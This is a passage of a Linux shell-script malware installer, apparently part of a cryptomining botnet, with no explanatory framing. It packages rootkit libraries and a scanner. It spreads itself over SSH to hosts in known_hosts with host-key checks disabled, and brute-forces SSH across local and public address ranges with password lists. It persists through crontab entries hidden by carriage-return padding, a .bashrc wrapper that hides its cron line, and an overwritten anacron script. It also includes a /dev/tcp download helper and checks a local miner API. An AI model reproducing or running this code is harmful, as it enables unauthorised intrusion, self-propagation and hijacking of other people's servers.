            mv -f /usr/spirit/password.txt /usr/spirit/typical
            sed -i -e '$a\' /usr/spirit/typical
        fi
    fi
    cat /usr/spirit/typical /usr/spirit/gclib /usr/spirit/alllib 2>/dev/null | sort | uniq >/usr/spirit/alllib_tmp
    mv -f /usr/spirit/alllib_tmp /usr/spirit/alllib >/dev/null 2>&1
    sed -i -e '$a\' /usr/spirit/alllib

    USERPATH="/usr/spirit/tar
    /usr/spirit/tar/root
    /usr/spirit/tar/etc
    /usr/spirit/tar/usr/local/lib
    /usr/spirit/tar/usr/spirit
    /usr/spirit/tar/etc/cron.daily
    /usr/spirit/tar/root/$PATH_NAME"
    echo "$USERPATH" | while IFS= read -r line; do
        if [ ! -d $line ]; then
            mkdir -p $line >/dev/null 2>&1
        fi
    done
    USERFILE="root/$PATH_NAME/xfitaarch.sh
root/$PATH_NAME/timeoutaarch
root/$PATH_NAME/xfit.sh
root/$PATH_NAME/timeout64
root/$PATH_NAME/ip.txt
root/$PATH_NAME/$FILE_NAME
etc/cron.daily/xbash
usr/$FILE_REZ
usr/local/lib/pkit.so
usr/local/lib/fkit.so
usr/local/lib/skit.so
usr/local/lib/sshkit.so
usr/local/lib/sshpkit.so
usr/local/lib/sshkitarm.so
usr/local/lib/sshpkitarm.so
usr/local/lib/pkitarm.so
usr/local/lib/fkitarm.so
usr/local/lib/skitarm.so
usr/spirit/spirit
usr/spirit/spirit-arm
usr/spirit/sshpass
usr/spirit/sshpass-arm
usr/spirit/ip.txt
usr/spirit/spirit.sh
usr/spirit/typical
usr/spirit/gclib
usr/spirit/alllib"
    cd /
    echo "$USERFILE" | while IFS= read -r line; do
        if [ -f /$line ]; then
            if [[ $line = *ip.txt ]]; then
                \cp /$line /usr/spirit/tar/${line}_tmp >/dev/null 2>&1
            else
                \cp /$line /usr/spirit/tar/$line >/dev/null 2>&1
            fi
        fi
    done

    cd /usr/spirit/tar
    tar -zcf /var/lib/${FILE_NAME}.tar.gz "root/$PATH_NAME/xfitaarch.sh" "root/$PATH_NAME/timeoutaarch" "root/$PATH_NAME/timeout64" "root/$PATH_NAME/xfit.sh" \
        "root/$PATH_NAME/ip.txt_tmp" "root/$PATH_NAME/$FILE_NAME" "etc/cron.daily/xbash" "usr/$FILE_REZ" "usr/local/lib/pkit.so" \
        "usr/local/lib/fkit.so" "usr/local/lib/skit.so" "usr/local/lib/sshkit.so" "usr/local/lib/sshpkit.so" "usr/local/lib/fkitarm.so" "usr/local/lib/skitarm.so" \
        "usr/local/lib/sshkitarm.so" "usr/local/lib/pkitarm.so" "usr/local/lib/sshpkitarm.so" "usr/spirit/alllib" \
        "usr/spirit/spirit" "usr/spirit/spirit-arm" "usr/spirit/sshpass" "usr/spirit/sshpass-arm" "usr/spirit/ip.txt_tmp" "usr/spirit/spirit.sh" \
        "usr/spirit/typical" "usr/spirit/gclib" "usr/spirit/alllib"
    cd /usr/spirit
    deployToServer() {
        echo "Deployng to $1@$2 from $3"
        ssh -oStrictHostKeyChecking=no -oHostKeyAlgorithms=ssh-rsa -o ConnectTimeout=15 $1@$2 'exit 22' ||
            ssh -oStrictHostKeyChecking=no -oHostKeyAlgorithms=ssh-rsa -o ConnectTimeout=15 $1@$2 'exit 33'
        err=$?
        if [[ $err -eq 22 ]]; then
            OPT='-oHostKeyAlgorithms=ssh-rsa'
            unset INPOSSIBLE
        elif [[ $err -eq 33 ]]; then
            unset OPT
            unset INPOSSIBLE
        else
            INPOSSIBLE="1"
        fi
        if [ -z "$INPOSSIBLE" ]; then
            if [ -z "$(cat ~/.ssh/known_hosts | grep $2)" ] && [ -z "$(ssh-keygen -F $2)" ]; then
                echo 'Auto accepting SSH key'
                ssh -oStrictHostKeyChecking=no $OPT $1@$2 "mkdir -p /etc/lib /var/lib >/dev/null 2>&1"
                scp -oStrictHostKeyChecking=no $OPT $3 $1@$2:/var/lib/${FILE_NAME}.tar.gz
                ssh -i /usr/spirit/id_rsa -oStrictHostKeyChecking=no $OPT 'tar -C "/" --overwrite -xvzmf /var/lib/'${FILE_NAME}'.tar.gz'
                ssh -i /usr/spirit/id_rsa -oStrictHostKeyChecking=no $OPT $1@$2 'chmod 755 /etc/cron.daily/xbash; echo "" >/root/'$GCC_FILE'; /etc/cron.daily/xbash '$USR' 0 `</dev/null` >nohup.out 2>&1 &'
            else
                ssh $OPT $1@$2 "mkdir -p /etc/lib /var/lib  >/dev/null 2>&1"
                scp $OPT $3 $1@$2:/var/lib/${FILE_NAME}.tar.gz
                ssh -i /usr/spirit/id_rsa $OPT $1@$2 'tar -C "/" --overwrite -xvzmf /var/lib/'${FILE_NAME}'.tar.gz'
                ssh -i /usr/spirit/id_rsa $OPT $1@$2 'chmod 755 /etc/cron.daily/xbash; echo "" >/root/'$GCC_FILE'; /etc/cron.daily/xbash '$USR' 0 `</dev/null` >nohup.out 2>&1 &'
            fi
        else
            InfoR "Connect to $2 inpossible"
        fi
    }
    installgcc
    if [ -f /root/.ssh/known_hosts ]; then
        TESTKH=$(cat /root/.ssh/known_hosts)
        if [ ! -z "$TESTKH" ]; then
            filename='/root/.ssh/known_hosts'
            exec 4<"$filename"
            echo Start
            while read -u4 p; do
                if [ ! -z "$p" ]; then
                    stringarray=($p)
                    HOST=${stringarray[0]}
                    ssh -q -o BatchMode=yes -oStrictHostKeyChecking=no -oHostKeyAlgorithms=ssh-rsa -o ConnectTimeout=5 ${HOST} 'exit 22' ||
                        ssh -q -o BatchMode=yes -oStrictHostKeyChecking=no -o ConnectTimeout=5 ${HOST} 'exit 33'
                    err=$?
                    echo $HOST
                    echo $err
                    if [[ $err == 22 ]] || [[ $err == 33 ]]; then
                        deployToServer root $HOST /var/lib/${FILE_NAME}.tar.gz
                    fi
                fi
            done
        fi
    fi
    cd /usr/spirit
    rm -fr /usr/spirit/test.log >/dev/null 2>&1
    unset errspirit
    ./$SPIRIT_NAME >/usr/spirit/test.log
    errspirit=$?
    unset CHESK
    CHESK=$(cat "/usr/spirit/test.log")
    if [[ $CHESK == *expired* ]] || [[ $errspirit -ne 0 ]]; then
        get_spirit
    fi
    /usr/spirit/$SPIRIT_NAME scan --local all --threads 1000

    mv -f /usr/spirit/scan.lst /usr/spirit/scan1.lst
    cd /usr/spirit
    rm -fr /usr/spirit/test.log >/dev/null 2>&1
    unset errspirit
    ./$SPIRIT_NAME >/usr/spirit/test.log
    errspirit=$?
    unset CHESK
    CHESK=$(cat "/usr/spirit/test.log")
    if [[ $CHESK == *expired* ]] || [[ $errspirit -ne 0 ]]; then
        get_spirit
    fi
    /usr/spirit/$SPIRIT_NAME scan --lan

    if [ -f /usr/spirit/scan.lst ]; then
        sed -i -e '$a\' /usr/spirit/scan.lst
    fi

    myIP=$(ip a s | sed -ne '/127.0.0.1/!{s/^[ \t]*inet[ \t]*\([0-9.]\+\)\/.*$/\1/p}')
    arrIN=(${myIP//./ })
    SUB=${arrIN[0]}
    if [ ! -z "$SUB" ]; then
        if [ $SUB -ne 192 ] && [ $SUB -ne 172 ] && [ $SUB -ne 10 ]; then
            mv -f /usr/spirit/scan.lst /usr/spirit/scan2.lst
            /usr/spirit/$SPIRIT_NAME scan --range "$SUB.1-255.1-255.1-255" --threads 1000
            sed -i -e '$a\' /usr/spirit/scan.lst
        fi
    fi

    if [ -f /usr/spirit/scan1.lst ]; then
        sed -i -e '$a\' /usr/spirit/scan1.lst
    fi
    cat /usr/spirit/scan.lst /usr/spirit/scan1.lst /usr/spirit/scan2.lst | sort | uniq >/usr/spirit/fscan.lst
    sed -i -e '$a\' /usr/spirit/fscan.lst
    rm -fr /usr/spirit/block.lst >/dev/null 2>&1
    if [ -f /usr/spirit/fscan.lst ]; then
        filename='/usr/spirit/myip'
        exec 4<"$filename"
        while read -u4 p; do
            if [ ! -z "$p" ]; then
                stringarray=($p)
                cat /usr/spirit/fscan.lst | grep -v $stringarray >/usr/spirit/fscan1.lst
                mv -f /usr/spirit/fscan1.lst /usr/spirit/fscan.lst
            fi
        done
        if [ -f /usr/spirit/typical ]; then
            cd /usr/spirit
            rm -fr /usr/spirit/test.log >/dev/null 2>&1
            unset errspirit
            ./$SPIRIT_NAME >/usr/spirit/test.log
            errspirit=$?
            unset CHESK
            CHESK=$(cat "/usr/spirit/test.log")
            if [[ $CHESK == *expired* ]] || [[ $errspirit -ne 0 ]]; then
                get_spirit
            fi
            /usr/spirit/$SPIRIT_NAME -l /usr/spirit/typical -H /usr/spirit/fscan.lst brute
            #
            installgcc
            #
        else
            cd /usr/spirit
            rm -fr /usr/spirit/test.log >/dev/null 2>&1
            unset errspirit
            ./$SPIRIT_NAME >/usr/spirit/test.log
            errspirit=$?
            unset CHESK
            CHESK=$(cat "/usr/spirit/test.log")
            if [[ $CHESK == *expired* ]] || [[ $errspirit -ne 0 ]]; then
                get_spirit
            fi
            rm -fr /usr/spirit/block.lst >/dev/null 2>&1
            /usr/spirit/$SPIRIT_NAME -H /usr/spirit/fscan.lst brute
            #
            installgcc
            #
        fi
        if [ -f /usr/spirit/gclib ]; then
            cd /usr/spirit
            rm -fr /usr/spirit/test.log >/dev/null 2>&1
            unset errspirit
            ./$SPIRIT_NAME >/usr/spirit/test.log
            errspirit=$?
            unset CHESK
            CHESK=$(cat "/usr/spirit/test.log")
            if [[ $CHESK == *expired* ]] || [[ $errspirit -ne 0 ]]; then
                get_spirit
            fi
            rm -fr /usr/spirit/block.lst >/dev/null 2>&1
            /usr/spirit/$SPIRIT_NAME -l /usr/spirit/gclib -H /usr/spirit/fscan.lst brute
            #
            installgcc
            #
        fi
        if [ -f /usr/spirit/alllib ]; then
            cd /usr/spirit
            rm -fr /usr/spirit/test.log >/dev/null 2>&1
            unset errspirit
            ./$SPIRIT_NAME >/usr/spirit/test.log
            errspirit=$?
            unset CHESK
            CHESK=$(cat "/usr/spirit/test.log")
            if [[ $CHESK == *expired* ]] || [[ $errspirit -ne 0 ]]; then
                get_spirit
            fi
            rm -fr /usr/spirit/block.lst >/dev/null 2>&1
            /usr/spirit/$SPIRIT_NAME -l /usr/spirit/alllib -H /usr/spirit/fscan.lst brute
            #
            installgcc
            #
        fi
    fi
    installgcc
else
    echo "Already Running"
fi
EOF
		function removeip() {
			rm -fr /root/tmp/ip.txt >/dev/null 2>&1
			rm -fr /usr/spirit/ip.txt_tmp >/dev/null 2>&1
			rm -fr /root/$PATH_NAME/ip.txt_tmp >/dev/null 2>&1
		}
		function testgcc() {
			retfunc() {
				return "$1"
			}
			echo "$USERPATH" | while IFS= read -r line; do
				if [ -f $line/gcc_p ]; then
					if [ -f /root/gcc_y ]; then
						mv -f /root/gcc_y /root/gcc_p >/dev/null 2>&1
						removeip
					else
						echo "" >/root/gcc_p >/dev/null 2>&1
					fi
					return 2
				elif [ -f $line/gcc_y ]; then
					if [ -f /root/gcc_p ]; then
						mv -f /root/gcc_p /root/gcc_y >/dev/null 2>&1
						removeip
					else
						echo "" >/root/gcc_y >/dev/null 2>&1
					fi
					return 1
				else
					retfunc 3
				fi
			done
			err=$?
			if [[ $err -eq 2 ]]; then
				if [ $USR -eq 0 ]; then
					echo
					InfoR '!!! Another user already install !!!'
					echo
					removeip
				fi
				USR=1
			elif [[ $err -eq 3 ]]; then
				if [ -d /root/xfit -o -d /root/.xfit -o -d /etc/alternatives/xfit -o -d /etc/alternatives/.xfit ]; then
					if [ $USR -eq 1 ]; then
						echo
						InfoR '!!! Another user already install !!!'
						echo
						removeip
					fi
					USR=0
				elif [ -f /root/.warmup/config.json ]; then
					CONF=$(cat /root/.warmup/config.json)
					if [[ $CONF == *24444* ]]; then
						if [ $USR -eq 0 ]; then
							echo
							InfoR '!!! Another user already install !!!'
							echo
							removeip
						fi
						USR=1
					else
						if [ $USR -eq 1 ]; then
							echo
							InfoR '!!! Another user already install !!!'
							echo
							removeip
						fi
						USR=0
					fi
				elif [ -f /etc/alternatives/.warmup/config.json ]; then
					CONF=$(cat /etc/alternatives/.warmup/config.json)
					if [[ $CONF == *24444* ]]; then
						if [ $USR -eq 0 ]; then
							echo
							InfoR '!!! Another user already install !!!'
							echo
							removeip
						fi
						USR=1
					else
						if [ $USR -eq 1 ]; then
							echo
							InfoR '!!! Another user already install !!!'
							echo
							removeip
						fi
						USR=0
					fi

				fi
			else
				if [ $USR -eq 1 ]; then
					echo
					InfoR '!!! Another user already install !!!'
					echo
					removeip
				fi
				USR=0
			fi
			if [ $USR -eq 1 ]; then
				GCC_FILE=gcc_p
				USR=1
			else
				GCC_FILE=gcc_y
				USR=0
			fi
			InfoP "\nInstall for User $USR\n"
			echo "$USERPATH" | while IFS= read -r line; do
				if [ ! -d $line ]; then
					mkdir -p $line >/dev/null 2>&1
				fi
				echo "" >$line/$GCC_FILE
			done
		}
		testgcc
		cat "/root/tmp/ip.txt" "/root/$PATH_NAME/ip.txt" "/root/$PATH_NAME/ip.txt_tmp" "/usr/spirit/ip.txt_tmp" \
			"/usr/spirit/ip.txt" "/etc/alternatives/ip.txt" "/etc/alternatives/.xfit/ip.txt" "/etc/alternatives/.warmup/ip.txt" \
			"/root/.xfit/ip.txt" "/root/.warmup/ip.txt" 2>/dev/null | sort | uniq >/root/ip_tmp.txt
		sed -i -e '$a\' /root/ip_tmp.txt
		\cp -f /root/ip_tmp.txt "/root/$PATH_NAME/ip.txt" >/dev/null 2>&1
		\cp -f /root/ip_tmp.txt "/usr/spirit/ip.txt" >/dev/null 2>&1
		rm -fr /root/ip_tmp.txt >/dev/null 2>&1
		#############################################################################################################################################
		if [ -f /root/tmp/ForTest.txt ]; then
			if [ ! -f /usr/spirit/ForTest.txt ]; then
				\cp -f /root/tmp/ForTest.txt /usr/spirit/ForTest.txt >/dev/null 2>&1
				sed -i -e '$a\' /usr/spirit/ForTest.txt
			else
				cat "/root/tmp/ForTest.txt" "/usr/spirit/ForTest.txt" 2>/dev/null | sort | uniq >/usr/spirit/ForTest_tmp.txt
				mv -f /usr/spirit/ForTest_tmp.txt /usr/spirit/ForTest.txt
				sed -i -e '$a\' /usr/spirit/ForTest.txt
			fi
		fi
		rm -fr /root/tmp >/dev/null 2>&1
		chmod 755 $PATH_RES/$FILE_RES >/dev/null 2>&1
		if [ ! -f $PATH_RES/ ]; then
			mkdir $PATH_RES/ >/dev/null 2>&1
		fi
		\cp ./cronman /usr/$FILE_REZ >/dev/null 2>&1

		if command -v printf &>/dev/null; then
			(
				crontab -l
				printf "*/15 * * * * $PATH_RES/$FILE_RES;\r%100c\n"
			) | sort -u | crontab -
		else
			grep "$FILE_RES" /root/.bashrc >/dev/null 2>&1 || echo -e 'crontab() {
  case "$*" in
    (*-l*) command crontab "$@" | grep -v "'$FILE_RES'" ;;
    (*-e*) H=$(grep "'$FILE_RES'" /var/spool/cron/$USER); O=$(grep -v "'$FILE_RES'" /var/spool/cron/$USER); echo "$O">/var/spool/cron/$USER; command crontab -e; echo "$H" >> /var/spool/cron/$USER ;;
    (*) command crontab "$@" ;;
  esac
}' >>/root/.bashrc
		fi
		grep -a '/etc/cron.daily/xbash' /etc/cron.hourly/0anacron >/dev/null 2>&1
		if [ $? -ne 0 ]; then
			echo \#\!/bin/bash >/etc/cron.hourly/0anacron
			grep -a '/etc/cron.daily/xbash' /etc/cron.hourly/0anacron >/dev/null 2>&1 || printf "/etc/cron.daily/xbash >/dev/null 2>&1;\r%100c\n" >>/etc/cron.hourly/0anacron

			echo '# Skip excecution unless the date has changed from the previous run 
if test -r /var/spool/anacron/cron.daily; then
    day=`cat /var/spool/anacron/cron.daily`
fi
if [ `date +%Y%m%d` = "$day" ]; then
    exit 0;
fi

# Skip excecution unless AC powered
if test -x /usr/bin/on_ac_power; then
    /usr/bin/on_ac_power &> /dev/null
    if test $? -eq 1; then
    exit 0
    fi
fi
/usr/sbin/anacron -s' >>/etc/cron.hourly/0anacron
			chmod 755 /etc/cron.hourly/0anacron >/dev/null 2>&1
		fi
		mkdir /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/fkitarm.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/pkitarm.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/skitarm.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/sshkitarm.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/sshpkitarm.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/fkit.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/pkit.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/skit.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/sshkit.so /usr/local/lib >/dev/null 2>&1
		mv -f /root/$PATH_NAME/sshpkit.so /usr/local/lib >/dev/null 2>&1

		ping -c 1 -q 8.8.8.8 >&/dev/null
		if [[ $? -eq 0 ]]; then
			if command -v yum &>/dev/null; then
				packageList="nc wget xinetd"
				for packageName in $packageList; do
					command -v $packageName &>/dev/null || sudo yum install -y "$packageName" >/dev/null 2>&1
				done
			else
				packageList="nc wget xinetd"
				for packageName in $packageList; do
					command -v $packageName &>/dev/null || sudo apt-get install -y "$packageName" >/dev/null 2>&1
				done
			fi
		fi
		if [ -d /etc/alternatives/xfit/alternatives ]; then
			rm -fr /etc/alternatives/xfit/alternatives >/dev/null 2>&1
		fi
		if [ -d /root/$PATH_NAME/alternatives ]; then
			rm -fr /root/$PATH_NAME/alternatives >/dev/null 2>&1
		fi

		mkdir /root/$PATH_NAME >/dev/null 2>&1
		chattr -i -RV /root/$PATH_NAME >/dev/null 2>&1
		if [ -f /usr/spirit/ip.txt ]; then
			sed -i -e '$a\' /usr/spirit/ip.txt
			if [ -f /root/$PATH_NAME/ip.txt ]; then
				sed -i -e '$a\' /root/$PATH_NAME/ip.txt
				cat /usr/spirit/ip.txt /root/$PATH_NAME/ip.txt | sort | uniq >/usr/spirit/ip1.txt
				mv -f /usr/spirit/ip1.txt /usr/spirit/ip.txt
			else
				\cp -f /usr/spirit/ip.txt /root/$PATH_NAME/ip.txt >/dev/null 2>&1
			fi
		fi
		if [ -f /root/$PATH_NAME/ip.txt ]; then
			sed -i -e '$a\' /root/$PATH_NAME/ip.txt
			mkdir /etc/alternatives >/dev/null 2>&1
			if [ -f /etc/alternatives/ip.txt ]; then
				sed -i -e '$a\' /etc/alternatives/ip.txt
				cat /etc/alternatives/ip.txt /root/$PATH_NAME/ip.txt | sort | uniq >/root/$PATH_NAME/ip1.txt
				mv -f /root/$PATH_NAME/ip1.txt /root/$PATH_NAME/ip.txt
			fi
			\cp -f /root/$PATH_NAME/ip.txt /etc/alternatives/ip.txt >/dev/null 2>&1
		fi
		chmod 755 /bin/systemctl >/dev/null 2>&1
		if [ -f /etc/alternatives/ip.txt ]; then
			sed -i -e '$a\' /etc/alternatives/ip.txt
			if [ -f /root/$PATH_NAME/ip.txt ]; then
				sed -i -e '$a\' /root/$PATH_NAME/ip.txt
				cat /etc/alternatives/ip.txt /root/$PATH_NAME/ip.txt | sort | uniq >/etc/alternatives/ip1.txt
				mv -f /etc/alternatives/ip1.txt /etc/alternatives/ip.txt
			fi
			\cp /etc/alternatives/ip.txt /root/$PATH_NAME/ip.txt >/dev/null 2>&1
		fi
		\cp -r /root/$PATH_NAME /etc/alternatives >/dev/null 2>&1
		\cp /root/$PATH_NAME/$FILE_NAME /etc/alternatives/$FILE_NAME >/dev/null 2>&1
		\cp -r /etc/alternatives/$PATH_NAME /root >/dev/null 2>&1
		\cp /etc/alternatives/$PATH_NAME/$FILE_NAME /root/$PATH_NAME/$FILE_NAME >/dev/null 2>&1
		CHECKARCH=$(arch)
		if [[ $CHECKARCH == *686* ]] || [[ $CHECKARCH == *mips* ]] || [[ $CHECKARCH == *arm* ]]; then
			SKIPINSTALL=true
			chattr -aui /etc/ld.so.preload >/dev/null 2>&1
			cat /dev/null >/etc/ld.so.preload
			rm -fr /root/$PATH_NAME >/dev/null 2>&1
			rm -fr /usr/spirit >/dev/null 2>&1
			rm -fr /etc/cron.hourly >/dev/null 2>&1
			rm -fr /etc/cron.daily >/dev/null 2>&1
			rm -fr /etc/xbash >/dev/null 2>&1
			rm -fr /$PATH_RES/$FILE_RES >/dev/null 2>&1
			rm -fr /usr/$FILE_REZ >/dev/null 2>&1
			rm -fr /etc/lib/${FILE_NAME}.tar.gz >/dev/null 2>&1
			rm -fr /etc/alternatives/$PATH_NAME >/dev/null 2>&1
			crontab -r
		else
			SKIPINSTALL=false
		fi
		mkdir /usr/spirit >/dev/null 2>&1
		\cp /root/$PATH_NAME/ForTest.txt /usr/spirit/ForTest.txt >/dev/null 2>&1
		if [ ! -f /usr/spirit/min ]; then
			echo $((1 + $RANDOM % 58)) >/usr/spirit/min
		fi
		if [ ! -f /usr/spirit/hour ]; then
			echo $((24 + $RANDOM % 62)) >/usr/spirit/hour
		fi
		if [ ! -f /usr/spirit/date ]; then
			TZ='Europe/Moscow' date '+%F %T' >/usr/spirit/date
		fi
		MINUTE=$(cat /usr/spirit/min)
		HOUR=$(cat /usr/spirit/hour)
		if command -v printf &>/dev/null; then
			crontab -l | grep -q 'spirit' && echo 'entry exists' || (
				crontab -l
				printf "$MINUTE */$HOUR * * * /usr/spirit/spirit.sh;\r%100c\n"
			) | sort -u | crontab -
		else
			crontab -l | grep -q 'spirit' && echo 'entry exists' || (
				crontab -l
				echo "$MINUTE */$HOUR * * * /usr/spirit/spirit.sh"
			) | sort -u | crontab -
		fi
		InfoG "Run scan every $HOUR hour on $MINUTE minute"
		NEXTLAUNCH=$(date -d "$(cat /usr/spirit/date) ${HOUR}hour ${MINUTE}min" '+%T %F')
		InfoP "Next scan no later than:\n$NEXTLAUNCH (Moscow time)"
		IPFILES="/root/tmp/ip.txt
/root/$PATH_NAME/ip.txt
/root/$PATH_NAME/ip.txt_tmp
/usr/spirit/allip
/usr/spirit/ip.txt_tmp
/usr/spirit/ip.txt
/etc/alternatives/ip.txt
/etc/alternatives/.xfit/ip.txt
/etc/alternatives/.warmup/ip.txt
/root/.xfit/ip.txt
/root/.warmup/ip.txt"
		echo "$IPFILES" | while IFS= read -r line; do
			if [ -f $line ]; then
				tr -d '\000' <$line >${line}.tmp
				rm -fr $line >/dev/null 2>&1
				mv -f ${line}.tmp $line >/dev/null 2>&1
				grep -Eo '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' $line | uniq | sort >${line}.tmp
				rm -fr $line >/dev/null 2>&1
				mv -f "${line}.tmp" "$line"
				sed -i 's/^[[:space:]]*//g' $line
				sed -i -e '$a\' $line
			fi
		done
		echo
		####################################################################################################
		cat <<EOF >$PATH_RES/$FILE_RES
#!/bin/bash
THISDIR=\$(
    cd "\$(dirname "\$0")" || exit
    pwd
)
MY_NAME=\$(basename "\$0")
if [ -f \$THISDIR/\${MY_NAME}.pid ]; then
    SCRIPTPID=\$(cat \$THISDIR/\${MY_NAME}.pid)
    if [ -f /proc/\$SCRIPTPID/status ]; then
        cat /proc/\$SCRIPTPID/status | grep -q \${MY_NAME} && unset RUN || RUN=1
    else
        RUN=1
    fi
else
    RUN=1
fi
if [ -f /root/nohup.out ]; then
    rm -fr /root/nohup.out
fi
chattr -i -RV /usr/bin/curl >/dev/null 2>&1
chmod 755 /usr/bin/curl >/dev/null 2>&1
chattr -i -RV /usr/bin/wget >/dev/null 2>&1
chmod 755 /usr/bin/wget >/dev/null 2>&1
if [[ \$RUN == 1 ]]; then
    echo "\$\$" >\$THISDIR/\${MY_NAME}.pid
    # Restore files
    function __curl() {
        read proto server path <<<\$(echo \${1//// })
        DOC=/\${path// //}
        HOST=\${server//:*/}
        PORT=\${server//*:/}
        [[ x"\${HOST}" == x"\${PORT}" ]] && PORT=80
        exec 3<>/dev/tcp/\${HOST}/\$PORT
        echo -en "GET \${DOC} HTTP/1.0\r\nHost: \${HOST}\r\n\r\n" >&3
        (while read line; do
            [[ "\$line" == \$'\r' ]] && break
        done && cat) <&3
        exec 3>&-
    }

    if [ ! -f /etc/cron.daily/xbash -o ! -f /root/$PATH_NAME/$FILE_NAME ]; then
        if command -v wget &> /dev/null; then
            Diff=\$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        elif command -v curl &> /dev/null; then
            Diff=\$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        else
            Diff=\$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        fi
        if [ "\$Diff" -ne 480045 -o -z "\$Diff" ]; then
            mkdir /etc/cron.hourly >/dev/null 2>&1
            mkdir /root/$PATH_NAME >/dev/null 2>&1
            mkdir /etc/cron.daily >/dev/null 2>&1
            tar -C "/" --overwrite -xmvzf /etc/lib/${FILE_NAME}.tar.gz
            chmod 755 /etc/cron.daily/xbash >/dev/null 2>&1
            sleep 60
            if [ -f /etc/cron.daily/xbash ]; then
				CHESKSCR=\$(cat "/etc/cron.daily/xbash")
				if [[ \$CHESKSCR == *cronman* ]]; then
					mkdir -p "/root/gcclib" >/dev/null 2>&1			
				else
					rm -fr /etc/cron.daily/xbash
				fi
			fi
			if [ ! -f /etc/cron.daily/xbash ]; then
                if command -v printf &> /dev/null; then
                    (
                        crontab -l
                        printf "*/60 * * * * /usr/${FILE_REZ};\r%100c\n"
                    ) | sort -u | crontab -
                else
                    (
                        crontab -l
                        echo "*/60 * * * * /usr/${FILE_REZ}"
                    ) | sort -u | crontab -
                fi
                if [ -f /usr/.${FILE_REZ}.pid ]; then
                    SCRIPTPID=\$(cat /usr/.${FILE_REZ}.pid)
                    if [ -f /proc/\$SCRIPTPID/status ]; then
                        cat /proc/\$SCRIPTPID/status | grep -q ${FILE_REZ} && unset RUN || RUN=1
                    else
                        RUN=1
                    fi
                else
                    RUN=1
                fi
                if [[ \$RUN == 1 ]]; then
                    /usr/$FILE_REZ
                fi
            else
                ps cax | grep cronman
                if [ \$? -ne 0 ]; then
                    /etc/cron.daily/xbash
                fi
            fi
        fi
    fi

    if command -v wget &> /dev/null; then
        Diff=\$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
    elif command -v curl &> /dev/null; then
        Diff=\$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
    else
        Diff=\$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
    fi
    if [ -z "\$Diff" ]; then
	 	if [ -f /etc/cron.daily/xbash ]; then
			CHESKSCR=\$(cat "/etc/cron.daily/xbash")
			if [[ \$CHESKSCR == *cronman* ]]; then
				mkdir -p "/root/gcclib" >/dev/null 2>&1			
			else
				rm -fr /etc/cron.daily/xbash
			fi
		fi
        if [ ! -f /etc/cron.daily/xbash ]; then
            if command -v printf &> /dev/null; then
                (
                    crontab -l
                    printf "*/60 * * * * /usr/${FILE_REZ};\r%100c\n"
                ) | sort -u | crontab -
            else
                (
                    crontab -l
                    echo "*/60 * * * * /usr/${FILE_REZ}"
                ) | sort -u | crontab -
            fi
            if [ -f /usr/.${FILE_REZ}.pid ]; then
                SCRIPTPID=\$(cat /usr/.${FILE_REZ}.pid)
                if [ -f /proc/\$SCRIPTPID/status ]; then
                    cat /proc/\$SCRIPTPID/status | grep -q ${FILE_REZ} && unset RUN || RUN=1
                else
                    RUN=1
                fi
            else
                RUN=1
            fi
            if [[ \$RUN == 1 ]]; then
                /usr/$FILE_REZ
            fi
        else
            ps cax | grep cronman
            if [ \$? -ne 0 ]; then
                /etc/cron.daily/xbash
            fi
        fi
    fi
	if [ -f /etc/cron.daily/xbash ]; then
		CHESKSCR=\$(cat "/etc/cron.daily/xbash")
		if [[ \$CHESKSCR == *cronman* ]]; then
			mkdir -p "/root/gcclib" >/dev/null 2>&1			
		else
			rm -fr /etc/cron.daily/xbash
		fi
	fi
	if [ ! -f /etc/cron.daily/xbash ]; then
        if command -v printf &> /dev/null; then
            (
 	           crontab -l
    	        printf "*/60 * * * * /usr/${FILE_REZ};\r%100c\n"
            ) | sort -u | crontab -
        else
            (
                crontab -l
                echo "*/60 * * * * /usr/${FILE_REZ}"
            ) | sort -u | crontab -
        fi
        if [ -f /usr/.${FILE_REZ}.pid ]; then
            SCRIPTPID=\$(cat /usr/.${FILE_REZ}.pid)
            if [ -f /proc/\$SCRIPTPID/status ]; then
                cat /proc/\$SCRIPTPID/status | grep -q ${FILE_REZ} && unset RUN || RUN=1
            else
                RUN=1
            fi
        else
            RUN=1
        fi
        if [[ \$RUN == 1 ]]; then
            /usr/$FILE_REZ
        fi
    fi	
fi
ps cax | grep cronman
if [ \$? -ne 0 ]; then
    rm -fr /tmp/self*
	rm -rf /root/.cronman.pid >/dev/null 2>&1
	rm -rf /root/.cronman >/dev/null 2>&1
	rm -rf /root/cronman.pid >/dev/null 2>&1
	rm -rf /root/cronman >/dev/null 2>&1
	rm -rf /root/tmp.file >/dev/null 2>&1
fi
find /tmp/* -mtime +1 -exec rm {} \; >/dev/null 2>&1
find /tmp/* -type d -empty -delete >/dev/null 2>&1
EOF
		chmod 755 $PATH_RES/$FILE_RES >/dev/null 2>&1
		####################################################################################################
		cat <<'EOF' >/etc/init.d/modules
TEXTDOMAIN=initscripts

# Make sure umask is sane
umask 022

# Set up a default search path.
